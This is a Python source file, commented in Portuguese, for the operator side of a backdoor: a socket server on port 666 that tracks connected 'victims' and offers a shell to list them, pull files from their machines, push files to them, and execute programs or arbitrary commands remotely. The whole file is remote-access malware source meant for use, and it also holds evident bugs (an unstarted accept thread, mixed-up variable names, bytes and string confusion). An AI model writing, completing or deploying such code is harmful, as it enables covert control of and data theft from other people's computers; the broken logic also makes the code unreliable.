import base64
import os
import socket
import threading


class Victim:
    """
    Classe para gerenciamento das vítimas.
    """
    def __init__(self, name: str, sock: socket) -> None:
        """
        Construct the victim.
        """
        self.name = name
        self.sock = sock
            

class Connection:
    """
    Connection object.
    """
    connection = socket.socket(
        socket.AF_INET,
        socket.SOCK_STREAM,
    )
    victims = []

    def __init__(self, host: str, port: int) -> connection:
        """
        Construct connection.

        1: Reutilização do endereço. Para caso o servidor seja finalizado e reiniciado.
        """
        self.connection.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)  # 1
        self.connection.bind((host, port))
        self.connection.listen(1) # 2

    def accept(self) -> None:
        """
        Accept the connection.

        1: Recebe cada nova conexão.
        2: Aguarda 1024 bytes do ID da vítima.
        3: Cria um objeto para gerenciamento.
        4: Adiciona na lista de vítimas.
        """
        while True:
            sock, addr = self.connection.accept()  # 1
            name = sock.recv(1024)  # 2
            victim = Victim(name, sock)  # 3
            self.victims.append(victim)  # 4


if __name__ == '__main__':
    conn = Connection('0.0.0.0', 666)
    victims = []
    threading.Thread(target=conn.accept)

    while True:  # 10: Laço infinito para utilização do shell para gerenciar as vítimas.
        try:  # 11
            command = input('SHELL> ')

            if command == '':  # 12: Se o comando do shell for só um enter, ignora.
                pass
            elif command == 'victims':  # 13: Comando que mostra o ID e nome das vítimas.
                print('ID\t|\tNAME')

                for idx, vct in enumerate(victims):  # 14: Adiciona, dinamicamente, um ID para as vítiams.
                    print(f'{idx}\t|\t{vct}')

            elif command.startswith('victim'):  # 15: Comando para gerenciamente de uma vítima.
                try:  # 16
                    victim = abs(int(command.split()[1]))  # 17: Captura a vítima pelo ID, sendo esse um inteiro positivo.

                    if victim > (len(victim)-1):  # 18: Verifica a validade do ID.
                        print('Invalid ID')
                        del victim  # 19: Remove a vítima da memória.

                except (IndexError, ValueError):  # 20: Trata erros de digitação do atacante.
                    print('Select victim by ID!')

            elif command.startswith(('download')):
                try:  # 21
                    _file = command.split()[1]  # 22: Determia o arquivo de download pelo nome passado no shell.
                    result = ''  # 23: Variável que acumulará os dados recebidos via socket.
                    downloaded = True  # 24: Para validar se o arquivo de download é válido.
                    print('Wait until download be finished ...')
                    victims[victim].sock.send('Download %s' % _file)  # 25: Envia para o para a vítima o arquivo de download.

                    while True:  # 26
                        response = victims[victim].sock.recv(1024)  # 27: Utiliza o socket da vítima para receber 1024 bytes de informação apenas.
                        result += response  # 28: Recebe e acumula os bytes do arquivo requisitado na linha de cima.

                        if not response: # 29
                            raise socket.error  # 30
                        elif '\\' in response:  # 31: Verifica se foi recebido '\' como resposta, pois isso será um arquivo inválido.
                            print('File not found!')
                            downloaded = False
                            break
                        elif '\n' in response:  # 32: '\n' é usado na transmissão para sinalizar o final da resposta do backdoor na vítima.
                            break

                    if downloaded:  # 33: True para arquivos válidos.
                        content = base64.b64decode(result)

                        with open(os.path.basename(_file), 'wb') as writer:  # 34: Cria o arquivo no diretório local.
                            writer.write(content)

                        print('Download complete!')

                except IndexError:  # 35
                    print('Usage: download <file_name>')

            elif command.startswith('upload'):
                try:  # 36
                    local_file = command.split()[1]  # 37: Arquvivo local a ser enviado para o PC da vítima.
                    remote_file = command.split()[2]  # 38: Nome que o arquivo vai receber no PC da vítima.

                    with open(local_file, 'rb') as reader:
                        _file = reader.read()  # 39: Realiza a leitura do arquivo para enviar o mesmo.

                    victims[victim].sock.send(f'Upload {_file}')  # 40: Envia para o PC da vítima o nome do arquivo.
                    print('Wait until the upload be finished ...')
                    # 41: Envia, em base64, para o PC da vítima o arquivo.
                    # O caracter '\n' serve para mostrar o final da transmissão.
                    victims[victim].sock.sendall(base64.b64encode(_file) + '\n')  # 41
                    # 42: Aguarda o recebimento de 26 bytes de resposta da máquina da vítima.
                    response = victims[victim].sock.recv(26)  # 42

                    if '\r' in response:  # 43: O caractere '\r' mostra que o socket da vítima levou timeout mas permanece ativo.
                        print(victims[victim].sock.recv(26))  # 44
                    else:  # 45: Para o caso de não levar o timeout.
                        print(response)

                except IndexError:  # 46
                    print('Usage: updaload <local_file> <remote_file>')

                except IOError:  # 47
                    print('File not found or victim disconnected!')

            elif command.startswith('exec'):
                try:  # 48
                    cmd = command.split()[1:]  # 49: Define qual será o arquivo a ser executado no PC da vítima.

                    if len(cmd) < 1:  # 50
                        raise IndexError  # 51

                    victim[victims].sock.send(command)  # 52: Envia para o PC da vítima o arquivo a ser executado.

                except IndexError:  # 53
                    print('Usage: exec <file> <parameters>')
                    print('E.g: exec sshd.exe -d')

                else:  # 54
                    result = victims[victim].sock.recv(28)  # 55: Recebe da vítima 28 bytes confirmando a execução do arquivo.

                    if not result:  # 56: Não terá conteúdo no caso do backdoor parar de executar no PC da vítima.
                        raise socket.error  # 57
                    elif '\r' in result:  # 58
                        print(victims[victim].sock.recv(28))  # 59: Aguarda o backdoor enviar a informação pós timeout.
                    else:  # 60
                        print(result)

            else:  # 61
                victims[victim].sock.send(command)  # 62
                result = ''  # 63

                while True:
                    # Caso seja executado notepad.exe, cmd.exe ou powershell.exe
                    # o servidor ficará aguardando por 1024 bytes de resposta do cliente
                    # Será necessário encerrar o notepad na vitima para que o servidor "descongele"
                    # 
                    # Para executar um arquivo use o módulo exe
                    response = victims[victim].sock.recv(1024)  # 64
                    result += response

                    if not response:  # 65
                        raise socket.error
                    elif response[-1] == '\n':  # 66
                        break

                    print(base64.b64decode(result))

        except NameError:  # 67
            print('Victim not defined!')

        except socket.error:  # 68
            print('Victim')
            victims[victim].sock.close()
            del victims[victim]
            del victim

        except KeyboardInterrupt:  # 69
            print('Ctrl+c pressed. Deleting current victim')

            try:  # 70
                victims[victim].sock.close()
                del victims[victim]
                del victim
            except NameError:  # 71
                pass
